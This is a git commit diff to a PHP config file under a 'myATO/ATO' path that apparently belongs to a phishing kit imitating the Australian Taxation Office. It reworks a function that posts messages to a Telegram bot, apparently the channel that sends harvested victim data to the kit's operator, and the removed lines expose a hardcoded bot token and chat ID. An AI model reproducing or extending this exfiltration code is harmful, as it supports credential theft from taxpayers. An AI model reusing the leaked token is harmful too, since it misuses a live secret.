68df324ae2d3262d7fbc1d76e0379ae6ba4fbae2
eftincomepaid <donew959@gmail.com>
2025-08-27 21:10:38 -0700

    Update config.php

--- myATO/ATO/config.php
+++ myATO/ATO/config.php
@@ -1,27 +1,23 @@
 <?php
-
-
 function send_telegram_msg($message){
-	// Put Your Telegram Information Here
-	$botToken  = '5399821839:AAGXUkAUxdEEPrGcXUucxLeyP_oTEhh2h_w';
-	$chat_id  = ['2111697779'];
-	
-	
-	$website="https://api.telegram.org/bot".$botToken;
-	foreach($chat_id as $ch){
-		$params=[
-		  'chat_id'=>$ch, 
-		  'text'=>$message,
-		];
-		$ch = curl_init($website . '/sendMessage');
-		curl_setopt($ch, CURLOPT_HEADER, false);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 3);
-		curl_setopt($ch, CURLOPT_POST, 3);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
-		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-		$result = curl_exec($ch);
-		curl_close($ch);
-	}
-	return true;
+    $botToken = getenv("TELEGRAM_BOT_TOKEN");
+    $chat_ids = explode(",", getenv("TELEGRAM_CHAT_IDS")); // comma separated list
+
+    $website = "https://api.telegram.org/bot" . $botToken;
+    foreach ($chat_ids as $chat_id) {
+        $params = [
+            'chat_id' => trim($chat_id),
+            'text'    => $message,
+        ];
+        $ch = curl_init($website . '/sendMessage');
+        curl_setopt($ch, CURLOPT_HEADER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $result = curl_exec($ch);
+        curl_close($ch);
+    }
+    return true;
 }
 ?>
